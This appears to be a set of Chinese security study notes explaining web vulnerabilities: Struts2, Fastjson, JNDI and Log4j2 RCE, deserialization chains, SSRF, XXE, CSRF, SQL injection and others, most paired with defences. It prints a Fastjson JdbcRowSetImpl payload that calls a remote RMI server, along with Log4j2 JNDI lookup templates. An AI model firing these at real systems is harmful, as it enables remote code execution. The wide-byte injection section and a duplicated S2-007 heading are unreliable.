struts2漏洞原理简介

struts2远程代码执行漏洞原理

​ struts2框架在处理action的时候，调用底层的getter/setter来处理参数，将每一个http的参数声明为一个ONGL表达式，在对OGNL表达式进行解析的时候，就可以执行恶意payload。主要根据触发的类型来划分具体的structs2漏洞。

ONGL表达式 OGNL是对象图导航语言(Object-Graph Navigation Languaged)

参考：https://mp.weixin.qq.com/s/6uADTxIFA9jCP7ZZNBro8g

S2-001漏洞

【原理】：该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接在表单构造Payload进行命令执行。

【修复】：触发漏洞根本原因在于，可以递归解析表单中的属性值从而导致用户输入的ognl表达式被（二次）执行；解决方法就是不再对表达式进行递归解析，如此用户输入的value值不会再被解析执行。

S2-003和S2-005漏洞

【原理】： 该版本漏洞触发源于ParameterInterceptor拦截器中（失效的安全配置），通过对传入参数进行正则表达式匹配[\p{Graph}&&[^,#:=]]*来限制恶意操作，，但通过构造参数绕过正则限制从而执行ognl表达式。（在S2-003中，可以通过unicode编码或八进制对”#”,”=”等字符进行绕过）

S2-007漏洞

【原理】当配置了验证规则-validation.xml时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析，从而造成远程代码执行。

【修复】在getOverrideExpr函数中进行了StringEscape，从而无法闭合单引号，也就无法构造OGNL表达式

S2-007漏洞

【原理】拦截器只检查传入的参数名是否合法，不会检查参数值。因此可先将Payload设置为参数值注入到上下文中，而后通过某个特定语法取出来就可以执行之前设置过的Payload。

S2-013漏洞

【原理】：struts2的标签中 和 都有一个 includeParams 属性，可以设置成如下值

  • none ：URL中不包含任何参数（默认）
  • get ：仅包含URL中的GET参数
  • all ： 在URL中包含GET和POST参数

此时 或尝试去解析原始请求参数时，会导致OGNL表达式的执行

S2-016漏洞

【原理】在struts2中，DefaultActionMapper类支持以action:、redirect:、redirectAction:作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。

S2-045漏洞

【原理】在使用基于Jakarta插件的文件上传功能时，恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。

S2-045与S2-046漏洞

【原理】在使用基于Jakarta插件的文件上传功能时，恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。

（S2-046则是在上传文件的Content-Disposition中的Filename参数存在空字节，在检查时抛出异常，从而进入buildErrorMessage()方法）

S2-053漏洞

【原理】本漏洞实质和S2-001原理是一样的。都是在解析标签时在org.apache.struts2.components.UIBean的end()方法中通过evaluateParams()对标签中的值进行解析从而执行ongl表达式的。在S2-053漏洞场景中，是通过Freemarker模版引擎渲染用户输入数据。

【原理】Struts2 会对某些标签属性（比如id，其他属性有待寻找）的属性值进行二次表达式解析，当这些标签属性中包含了%{xx}且xx用户可控，则在渲染该标签时可造成ognl表达式执行。

Fastjson反序列化漏洞

Fastjson介绍

​ 一款json字符串处理库，主要处理java对象与json字符串的序列化和反序列化操作。Fastjson有一套自己的序列化机制，它包含了一个autoType功能，该功能让JSON字符串中多出了一个@type字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型。

漏洞原理

​ 因为autoType功能，fastjson在对JSON字符串进行反序列化的时候，会读取@type的内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。那么就可以利用这个特性，自己构造一个JSON字符串，并且使用@type指定一个自己想要使用的攻击类库，后面就是JNDI注入过程了。

事例漏洞-JdbcRowSetImpl利用链（反序列化攻击）

​ JdbcRowSetImpl利用链的重点就在怎么调用autoCommit的set方法，而fastjson反序列化的特点就是会自动调用到类的set方法，所以会存在这个反序列化的问题。只要制定了@type的类型，她就会自动调用对应的类来解析。

利用方法

​ 在@type的类型为JdbcRowSetImpl类型的时候，JdbcRowSetImpl类就会进行实例化，那么只要将dataSourceName传给lookup方法，就可以保证能够访问到远程的攻击服务器，再使用设置autoCommit属性对lookup进行触发就可以了。

步骤：

​ 通过设置dataSourceName将属性传参给lookup的方法—>设置autoCommit属性，利用SetAutoCommit函数触发connect函数—>触发connect函数下面lookup函数就会使用刚刚设置的dataSourceName参数，即可通过RMI访问到远程服务器，从而执行恶意指令。

exploit如下：

{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”rmi://192.168.0.1:4444/Exploit”,”autoCommit”:true}

JNDI 注入

JNDI接口（Java Naming and Directory Interface，JAVA命名和目录接口），它提供一个目录系统功能，将服务名称与对象关联起来，使得开发人员可以使用名称来访问对象。JNDI可访问的目录以及服务有：JDBC，LDAP，RMI等。使用lookup的搜索查找方法，lookup通过提供的名称查找对象（如何这个参数可控，就可能导致漏洞出现）

JNDI注入漏洞原理

当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI/LDAP注册表中绑定的恶意Reference类，恶意Reference引用指向远程恶意的class文件，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行。（JNDI注入主要是用过下载远程class，来运行恶意代码。）

JNDI注入-RMI

【流程】：攻击者注入带有恶意RMI地址的payloadà服务器靶机的JNDI调用lookup方法解析到恶意RMI地址并去访问à恶意RMI服务器返回Reference对象（告诉请求端所请求对象所在的类）à服务器靶机去Reference指定的恶意服务器获取（下载）资源（恶意class文件）à服务器靶机下载恶意资源（恶意class文件）并解析，即执行了恶意代码/程序。

Log4j2漏洞

Apache Log4j2 远程代码执行漏洞原理

​ Apache Log4j2 框架中存在一个名为 JNDI Lookup 的功能（查找搜索），该功能模块在输出日志信息时允许通过配置文件中的 JNDI 接口引用外部资源（LDAP 服务器或 RMI 服务器），访问的外部资源会被反序列化为Java对象，作为jndi返回；当外部资源是恶意内容（如恶意代码的class文件），在反序列化过程中就会执行里面的恶意代码/程序。

简单的说：利用Log4j2框架实现JNDI注入

​

攻击者如何控制服务器上记录的日志内容呢？

大部分web服务程序都会对用户输入进行日志记录。例如：用户访问了哪些url，有哪些关键的输入等，都会被作为参数送到log4j中。

  • LDAP协议（轻型目录访问协议）：

是一个开放的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。

  • RMI协议（远程方法调用）：

它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。

Log4j2-RMI漏洞

示例原理：

步骤1：攻击者发送一个HTTP请求，其用户名为${jndi://rmi服务器地址/Exploit}

步骤2：被攻击服务器发现要输出的信息中有**${}**，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用RMI，然后根据RMI服务器地址去请求Exploit。

步骤3：恶意RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类）。

步骤4：被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。

步骤5： 被攻击服务器下载恶意class文件并执行其中的恶意代码

Log4j2-LDAP漏洞

示例原理：

步骤1：当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中，假如日志中含有该语句${jndi:ldap:恶意ldap服务器上exp的路径}

步骤2：被攻击服务器发现要输出的信息中有${}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp

步骤3：解析到ldap，就会去恶意JNDI服务器的ldap服务找名为exp的资源，如果找不到就会去http服务中找，找到exp之后，就会将资源信息返回给应用程序的log4j组件，当log4j组件发现exp是一个.class文件，就会去执行里面的代码，攻击者就实现了远程命令攻击了。

反序列化漏洞

​ java反序列化漏洞是指在反序列化过程中自动执行类中readObject方法导致的漏洞，类似于PHP反序列化时会自动执行__wakeup方法一样。如果readObject中执行了某种危险的操作，就可能到做反序列化漏洞。

​ java反序列化调用链从本质来说就是构造一条从反序列化入口Source到危险方法Sink的调用链。反序列化的Source点一定是从readObject方法开始，但是Sink点却可以有很多种不同的类型。最常见的反序列化Sink是命令执行，但是也有可能是文件上传、SSRF、XXE等其他类型的Sink。

图. java反序列化调用链原理

0x01 JAVA与PHP反序列化

​ JAVA序列化之后的数据是满足特定序列化协议的字符流，PHP序列化之后是一种类似json的格式。JAVA序列化之后的数据是不可读的，PHP序列化之后的数据是可读的。

0x02 反序列化触发点不同

​ JAVA反序列化的入口点Source是readObject方法。而PHP与JAVA不同，PHP反序列化的入口点Source是魔法方法，如__wakeup和__destruct方法。

​ PHP的魔术方法是指以（__）开头的函数方法，通常是在某种条件下自动触发执行的方法。因为PHP魔术方法的存在，为反序列化利用链的构造增加很多思路，可以通过特定魔术方法拓宽反序列化利用链；在反序列化的过程中常用的魔术方法如表下：

**表.PHP反序列化常用魔术方法**
方法名 方法介绍
__wakeup 在调用unsearialize()时，自动执行该方法。属于反序列化Source之一。
__destruct 析构函数，在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。属于反序列化Source之一。
__toString 一个类被当成字符串时自动调用该方法。属于反序列化利用链中常见魔术方法之一。
__call 在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法。属于反序列化利用链中常见魔术方法之一。
__set 给不可访问的属性赋值时自动调用该方法。属于特定场景下反序列化利用链会用到的方法。
__get 读取不可访问属性的值时自动调用该方法。属于特定场景下反序列化利用链会用到的方法。
__invoket 当尝试以调用函数的方式调用一个对象时自动调用该方法。属于特定场景下反序列化利用链会用到的方法。

​ 与PHP不同的是，JAVA并没有严格意义上的魔术方法，但是其实JAVA里面有一些类似的方法。JAVA在构造反序列化利用链时比PHP更加灵活，因为JDK代码大多数情况下还是JAVA编写的，可以方便的通过调试技巧来确定不同类方法之间的相互调用。

方法名 方法介绍
readObject 在反序列化的过程中会自动调用改方法，属于反序列化的入口Source。
toString 把对象当成字符串来操作是会自动调用该方法。
hashCode 返回该对象的hash值，集合类操作时会调用此方法。
equals 对象进行比较、排序、查找时可能可能调用此方法。
finalize 当垃圾回收器确定不存在对该对象的更多引用时，由对象的垃圾回收器调用此方法。

0x03 类加载机制不同

​ PHP中要调用某个类必须要引入，PHP引入类文件常见的是这四种方式require、require_once、inclue、include_once。在反序列化的过程中，反序列化利用链中的每一个类也都必须是显式引入的，即必须通过上面四个函数中的某一个引入对应的类文件。如果不引入，就会报错。

​ JAVA中类加载只与classpath有关，只要是在classpath中的类就能被直接调用。JAVA中并不要求在调用类之前进行显式引入，一般来说项目jar包中的类都可以任意调用；因此Java的反序列化比较多。

Java反序列化漏洞之利用链

​ 反序列化漏洞的利用几乎都需要反序列化攻击利用链，例如shiro反序列化漏洞，知道了密钥key，如果没有合适的攻击利用链也没发攻击成功。反序列化利用链是整个反序列化利用过程中最关键的一环，通常反序列化利用链需要借助常用的第三方jar包，其中最有名的就是CommonCollections利用链（简称CC链）。

URLDNS利用链

​ URLDNS链是JAVA众多利用链中最简单的一条利用链，非常适合初学者研究学习，具有下面的特点：

a) 利用链只依赖jdk本身提供的类，不依赖其他第三方类，所以具有很高的通用性，可以用于判断目标是否存在反序列化漏洞。

b) 利用链本身只能执行域名解析的操作，不能执行系统命令或者其他恶意操作。如果提交利用链是URLDNS的反序列化漏洞，漏洞提交平台可能会拒绝这个漏洞。

Over permission（越权漏洞）

​ 如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。以下是越权漏洞的步骤、攻击方法和防御方法。

步骤：

  1. 攻击者通过渗透测试或其他方式，获取到目标网站的漏洞或不当配置。
  2. 攻击者利用漏洞或不当配置，获取到未授权的权限或访问未授权的资源。
  3. 攻击者利用所获得的权限进行攻击，如获取敏感信息、修改数据等。

攻击方法：

  1. 直接访问URL：攻击者可以直接访问受限制的URL，如管理后台、用户个人信息等。
  2. 修改参数：攻击者可以修改请求参数，如将用户ID改为其他用户的ID，以获取其他用户的信息。
  3. 暴力猜解：攻击者可以通过暴力猜解密码等方式，获取到受限制的权限。
  4. 会话劫持：攻击者可以通过劫持会话，获取到受限制的权限。

防御方法：

  1. 权限控制：在程序中对用户权限进行控制，限制用户对资源的访问。（1）使用最小权限原则对用户进行赋权;（2）使用合理（严格）的权限校验规则;（3）使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件。
  2. 输入验证：对用户输入的数据进行验证和过滤，防止攻击者通过修改参数获取未授权的访问。
  3. 会话管理：采用合适的会话管理机制，如使用HTTPS协议、设置有效期、强制重新登录等。
  4. 安全配置：对服务器和应用程序进行安全配置，如关闭不必要的服务和端口、限制访问权限等。
  5. 安全审计：对程序进行安全审计，及时发现和修复漏洞，提高程序的安全性。

目录遍历

​ 在web功能设计中,很多时候会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。
​ 看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样。需要区分一下的是,如果通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，这里称为敏感信息泄露 而并不归为目录遍历漏洞。

目录遍历漏洞（Directory Traversal Vulnerability），也称为路径遍历漏洞，是指攻击者通过输入特殊的字符序列，绕过文件访问控制，获取未授权的访问权限，可以访问受保护的系统文件、敏感数据和应用程序源代码等，进而对系统造成危害。

目录遍历漏洞攻击通常涉及以下步骤：

  1. 攻击者通过URL或Web应用程序界面输入一个带有特殊字符的参数（如 ../ 等）来绕过应用程序的文件访问控制。
  2. 应用程序没有正确地过滤或验证该参数，因此攻击者可以访问未授权的文件或目录。
  3. 攻击者可以执行恶意代码，访问敏感数据或者修改系统文件，从而控制整个应用程序或者系统。

目录遍历漏洞常见的攻击方法包括：

  1. 输入 ../ 或 ..\ 等字符序列来向上遍历目录，从而访问父目录及其它目录中的文件。
  2. 利用 %00 空字节截断技术绕过文件名的限制，访问被截断后的文件。
  3. 利用 URL 编码、Unicode 编码、HTML 实体编码等技术绕过应用程序的过滤和检查，访问目标文件。

防御目录遍历漏洞的方法包括：

  1. 对输入的参数进行过滤和验证，确保只能访问受控的文件和目录。
  2. 应用程序和Web服务器应该在访问文件和目录时使用绝对路径，而不是相对路径。
  3. 禁止使用特殊字符和文件名，如 ../ 、 ..\ 、 %00 等。
  4. 确保Web服务器配置安全，限制应用程序的访问权限，避免攻击者利用目录遍历漏洞访问系统文件和目录。
  5. 更新应用程序和操作系统的补丁，确保已修复已知的目录遍历漏洞。

敏感信息泄露

​ 敏感信息泄露漏洞是指未经授权访问，通过各种手段（例如：爬虫、目录遍历、注入攻击等）获取到敏感信息并且泄露出去，从而导致用户的隐私被泄露或者公司的机密信息被泄露的一种漏洞。由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。比如：
—通过访问url下的目录，可以直接列出目录下的文件列表;
—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;
—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;

攻击者通过敏感信息泄露漏洞可以获取到包括但不限于以下信息：

  1. 用户名、密码等登录凭证
  2. 个人身份证号码、手机号码等隐私信息
  3. 公司机密文件、源代码等重要信息

以下是敏感信息泄露漏洞的攻击方法和防御方法：

【攻击方法】：

  1. 爬虫：攻击者通过编写爬虫程序，对网站的数据进行抓取，并存储在自己的数据库中。
  2. 目录遍历：攻击者通过利用目录遍历漏洞，获取到服务器上的敏感信息。
  3. 注入攻击：攻击者通过SQL注入等攻击手段，获取到网站数据库中的敏感信息。
  4. 钓鱼网站：攻击者制作钓鱼网站，通过欺骗用户输入个人敏感信息的方式，获取用户的敏感信息。

【防御方法】：

  1. 对于爬虫攻击，可以使用反爬虫技术，例如：设置验证码、IP频率限制、User-Agent限制等。
  2. 对于目录遍历漏洞，应该对网站的目录权限进行正确的设置，并且禁止用户输入../等目录遍历符号。
  3. 对于注入攻击，应该对用户输入的数据进行正确的过滤和验证，并使用预编译语句等技术来避免SQL注入攻击。
  4. 对于钓鱼网站，应该加强对用户的身份验证，例如使用双因素身份认证等技术，同时提高用户对钓鱼网站的识别能力。

xxe

XML外部实体（XML External Entity，简称XXE）注入漏洞是一种常见的安全漏洞，攻击者可以利用该漏洞从外部读取系统文件、进行端口扫描等操作，甚至可能导致服务器被完全控制。以下是XXE注入漏洞的一般判断方法、攻击步骤和防御方法：

【判断方法】

  1. 对外部实体文件的引用：XML文件中包含对外部实体文件的引用，例如DTD（文档类型定义）文件、XSD（XML模式定义）文件等。
  2. 外部实体文件的内容可控：如果外部实体文件的内容可以被攻击者所控制，那么攻击者就可以通过修改这些文件来实现攻击目的。
  3. 对外部实体文件的解析方式存在问题：如果服务器在解析外部实体文件时存在漏洞

【攻击步骤】：

  1. 构造含有恶意外部实体的XML文件。
  2. 向目标系统提交带有恶意XML文件的请求。
  3. 服务器解析请求中的XML文件，并读取恶意外部实体中的内容。
  4. 攻击者利用获取到的信息实施攻击。

【防御方法】：

  1. 禁止或限制外部实体：在解析XML文件时，禁止或限制外部实体的定义和使用，可使用一些安全的XML解析器或API，如SAXParser，DOM4J等。
  2. 输入过滤：对于XML文件中的输入参数，应该对其进行严格的输入验证和过滤，包括格式检查、长度检查、正则表达式检查等。
  3. 强制使用最新版的XML解析器：最新版的XML解析器可能会包含已知的漏洞修复，使用最新版的XML解析器可增强系统的安全性。
  4. 系统硬化：禁用或限制不必要的服务、端口，如FTP、Telnet等，减少攻击面。
  5. 授权控制：限制只有授权用户才能访问XML文件解析服务，同时对用户权限进行细化控制。

URL重定向

​ URL重定向漏洞（URL Redirection Vulnerability）是指攻击者通过构造恶意URL，诱导用户点击链接，使其跳转到攻击者指定的URL上，从而进行钓鱼攻击、恶意软件下载等攻击行为。

【攻击类型】：

  1. 钓鱼攻击：攻击者构造一个伪造的URL，诱导用户点击，将用户重定向到一个看似正常的页面，但实际上是攻击者构造的恶意页面，以此来获取用户的敏感信息。
  2. 诱导下载：攻击者通过构造恶意URL，将用户重定向到一个看似正常的页面，但实际上是一个恶意软件下载页面，从而让用户下载并安装恶意软件。
  3. 收集信息：攻击者通过构造恶意URL，将用户重定向到一个看似正常的页面，但实际上是一个收集用户信息的页面，从而获取用户的敏感信息。

【防御措施】：

  1. 对URL进行输入合法性验证，过滤掉非法字符，限制URL跳转的范围。
  2. 对跳转目标URL进行白名单验证，限制跳转目标的范围。
  3. 通过设置Referrer检测，限制重定向来源，避免跨站点攻击。
  4. 对URL跳转进行统一管理和跟踪，及时发现并防御攻击行为。

SSRF

​ SSRF（Server-Side Request Forgery）漏洞是指攻击者通过构造恶意的请求，使得服务器发起对内部系统或外部系统的请求，并将响应结果返回给攻击者，从而可能导致内部系统的敏感信息泄露、服务端请求伪造、甚至对内部系统发起攻击等安全问题。攻击者通常会利用SSRF漏洞来获取内部系统的敏感信息，比如访问内部接口、读取配置文件、窃取密码等；也可以通过SSRF漏洞发起攻击，如利用内部系统发起DDoS攻击、横向渗透攻击等。

【SSRF漏洞判断步骤】

  1. 确认应用程序中是否包含从外部获取URL的功能，例如从用户输入、请求参数、外部文件等获取URL的功能。
  2. 尝试构造URL，指向内部网络的资源，例如在URL中使用”file://“、”ldap://“、”dict://“等协议，或者使用IP地址和端口号指向内部网络的资源。
  3. 观察应用程序的响应是否包含了来自内部网络的敏感信息，例如主机名、端口号、文件名、目录结构等信息。
  4. 观察应用程序的响应是否存在请求了多个URL，但只有部分URL返回结果的情况，这可能表明应用程序正在尝试访问内部网络中的资源。
  5. 使用工具进行测试，例如Burp Suite、OWASP ZAP等可以检测SSRF漏洞的漏洞扫描器，或者自行编写脚本进行测试。

【SSRF漏洞利用】：

  1. 利用URL地址栏参数漏洞：攻击者可以通过修改URL参数，将请求发送到其他内部或外部系统。
  2. 利用Web应用程序的漏洞：攻击者可以通过Web应用程序内部的漏洞，发送特定的请求，进而发起SSRF攻击。
  3. 利用协议处理漏洞：攻击者可以通过构造特定的协议请求，利用协议处理漏洞，进而发起SSRF攻击。

【防御措施】

  1. 验证用户输入：对用户输入进行严格的输入验证和过滤，避免用户输入可疑的URL地址或参数。
  2. 设置白名单：对所有外部请求的目标URL地址和协议进行白名单过滤，只允许请求安全可信的URL地址和协议。

CSRF（跨站请求伪造）

CSRF（Cross-Site Request Forgery）又叫”one click”攻击，是一种网络安全攻击，攻击者利用用户已登录的身份，在受害者不知情的情况下伪造请求，实现对目标网站的攻击。其攻击流程和防御措施如下：

攻击流程：

  1. 用户登录目标网站并获取到有效的session
  2. 攻击者构造恶意网页或者其他方式欺骗用户访问特定的URL
  3. 目标网站验证session后执行请求，由于请求是在用户身份下发起的，因此无法判断是否是恶意的
  4. 攻击成功，目标网站的数据被篡改或者被删除等

攻击原理：

攻击者在用户已登录的情况下，通过伪造请求让目标网站误以为这是合法的请求。由于目标网站在验证请求时只验证了session，而未对请求来源进行验证，因此攻击者可以伪造请求，实现对目标网站的攻击。

防御措施：

  1. 使用CSRF Token：网站在每个表单中都添加一个随机生成的token，每次提交表单时都需要带上这个token，如果token与服务器上存储的不一致，就会拒绝请求。这样可以有效防止攻击者伪造请求。
  2. 验证Referer头：在服务器端验证HTTP Referer头，检查请求来源是否是本站，如果不是则拒绝请求。
  3. 使用验证码：在关键操作（如修改密码、删除数据等）前要求用户输入验证码，增加攻击者的难度。
  4. 阻止第三方网站的请求：在服务器端禁止第三方网站的请求，只允许本站请求。
  5. 安全设置：在服务器端对数据进行安全设置，如限制表单的请求时间、添加IP地址白名单等。

【CSRF与XSS的区别】：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，例如通过构造恶意连接，让受害者自己点击执行恶意代码；而XSS是直接盗取到了用户的权限，然后实施破坏。

SQL-Inject（SQL注入）

​ SQL注入（SQL Injection）是一种常见的Web应用程序安全漏洞，攻击者通过恶意构造输入数据，可以让应用程序执行非预期的SQL命令，从而破坏、窃取或修改数据库中的数据。下面将介绍SQL注入的流程、原理以及防御措施。

【SQL注入的流程】

（0）判断是否存在SQL注入漏洞，类型是什么

（1）构造恶意输入数据，注入恶意SQL代码；

（2）将构造好的数据发送到Web应用程序的后台服务器；

（3）Web应用程序后台服务器将收到的数据作为SQL查询语句的一部分，与其它SQL代码组合后发送给数据库服务器；

（4）数据库服务器执行恶意SQL代码，将查询结果返回给Web应用程序后台服务器；

（5）Web应用程序后台服务器将查询结果返回给客户端，攻击者获得了所需的数据。

【SQL注入的原理 】

（1）SQL语句的拼接问题：Web应用程序在拼接SQL语句时，如果不对用户输入数据进行过滤和验证，将恶意数据拼接到SQL语句中，攻击者可以通过修改原有的SQL语句实现SQL注入攻击。

（2）数据类型的转换问题：当Web应用程序使用动态语言（如PHP、Python等）处理用户输入时，数据类型转换是很常见的。攻击者可以利用这一特点，在注入语句中通过数据类型转换绕过数据过滤。

（3）数据库权限问题：如果数据库用户权限不当，攻击者可以通过SQL注入攻击获得管理员权限，从而对数据库进行恶意操作。

【SQL注入的防御措施 】

（1）输入过滤和验证：Web应用程序应该对用户输入的数据进行过滤和验证，确保输入数据的合法性。

（2）使用参数化查询：使用参数化查询可以有效地避免SQL注入攻击，因为参数化查询会将用户输入数据和SQL查询语句分开处理。

（3）最小权限原则：在数据库中为应用程序创建专用的用户，并给予最小权限，防止攻击者通过注入攻击获得管理员权限。

（4）使用ORM框架：ORM（Object-Relational Mapping）框架可以有效地避免SQL注入攻击，因为ORM框架会自动对输入数据进行过滤和转义。

（5）关闭错误输出：关闭错误输出可以有效地避免攻击者利用错误信息进行攻击。

（6）定期更新应用程序和数据库：应该定期更新Web应用程序和数据库软件，以确保已知漏洞得到及时修复。

宽字节注入

​ 宽字节注入（Wide-Character Injection），是一种针对ASP程序开发的攻击方式，该攻击利用了ASP解释器对双字节字符的处理不一致，通过输入特定的双字节字符来使得ASP程序解释器解释出错，从而导致安全漏洞的产生。

​ 宽字节注入的攻击方式与SQL注入类似，攻击者利用网站表单或URL参数传递恶意的特殊字符，让应用程序误认为是合法的输入，从而绕过输入验证过程，进而执行攻击者自己编写的SQL语句，达到控制数据库的目的。

【宽字节注入攻击的原理】利用ASP解释器对Unicode编码的字符的不同处理方式。ASP程序默认使用的是Unicode编码，也就是采用双字节来表示一个字符。由于不同语言的双字节字符的表示方式不同，例如中文使用的双字节编码是gb2312或utf-8，而英文则使用ASCII码表示，所以ASP程序会将输入的字符转换成相应的Unicode编码。

​ 攻击者可以在输入的字符前面加上%00，这样ASP解释器就会将其当作Unicode编码的字符处理，而%00是Unicode编码中的空字符，也就是一个字符的结尾。攻击者可以利用这个特性，将恶意的SQL语句放在宽字符后面，使得ASP程序解释器将宽字符当作一个完整的字符来处理，从而绕过了输入验证过程。

【防御】：

  1. 输入验证：对于所有的输入都需要进行严格的验证和过滤，包括特殊字符和宽字符。
  2. 输出过滤：对于所有的输出都需要进行过滤，包括HTML和SQL语句，避免将恶意脚本或SQL注入语句输出到页面或数据库。
  3. 使用预编译语句：使用预编译语句可以将SQL语句与用户输入分离，从而避免SQL注入攻击。
  4. 数据库授权：为数据库用户授予最小权限，避免攻击者通过注入攻击获取过多的数据库权限。
  5. 安全编码：在开发过程中，要注重安全编码，避免在代码中留下安全漏洞。

RCE(远程命令执行/远程代码执行)

​ RCE(remote command/code execute)漏洞是Command Injection（命令注入）漏洞的一种；RCE漏洞，是指攻击者能够在目标系统上执行任意代码，从而导致系统被完全控制的安全漏洞。攻击者通常利用此漏洞进行非法活动，如盗取敏感信息、篡改数据、植入后门等。以下是远程命令执行漏洞的流程、攻击方式和防御措施。

流程

远程命令执行漏洞的攻击流程通常如下：

  1. 攻击者通过漏洞扫描或其他手段寻找目标系统上的漏洞。
  2. 攻击者确定目标系统上存在远程命令执行漏洞。
  3. 攻击者通过利用漏洞，向目标系统发送恶意请求，包含攻击者编写的恶意代码。
  4. 目标系统收到请求并执行其中的代码。
  5. 攻击者通过执行的恶意代码控制目标系统。

攻击方式

远程命令执行漏洞的攻击方式多种多样，常见的攻击方式包括：

  1. 通过Web应用程序进行攻击：攻击者通过在Web应用程序中注入恶意代码来攻击目标系统。这种攻击方式通常会利用Web应用程序的输入验证漏洞。
  2. 通过网络协议进行攻击：攻击者通过向目标系统发送恶意数据包来触发漏洞。这种攻击方式通常会利用网络协议中的缓冲区溢出漏洞等，例如FTP或者SSH等协议中的漏洞。
  3. 通过文件上传进行攻击：攻击者通过上传恶意文件来攻击目标系统。这种攻击方式通常会利用文件上传功能的漏洞。

防御

为了防止远程命令执行漏洞的攻击，可以采取以下防御措施：

  1. 输入验证和过滤：应用程序需要对用户输入的数据进行验证和过滤，从而防止恶意代码的注入。例如，应用程序可以对输入的数据进行格式化或者限制输入的范围。
  2. 使用参数化的命令：应用程序应该使用参数化的命令，而不是拼接字符串来构造系统命令。参数化的命令可以防止命令注入攻击。
  3. 最小化权限：应用程序应该以最小的权限来运行系统命令。如果应用程序没有必要执行某些系统命令，应该禁止应用程序执行这些命令。
  4. 安全编码：应用程序应该使用安全编码实践来防止远程命令执行攻击。例如，应该避免使用 eval() 或者 exec() 等可以执行任意代码的函数。
  5. 漏洞扫描和修复：应用程序需要定期进行漏洞扫描和修复，及时发现和修复潜在的漏洞。

远程系统命令执行
一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上， 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器 （现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞）

File Inclusion(文件包含漏洞)概述

​ 文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：include()、include_once() 、require()、require_once() 这些文件包含函数，这些函数在代码设计中被经常使用到。

​ 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：

1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。

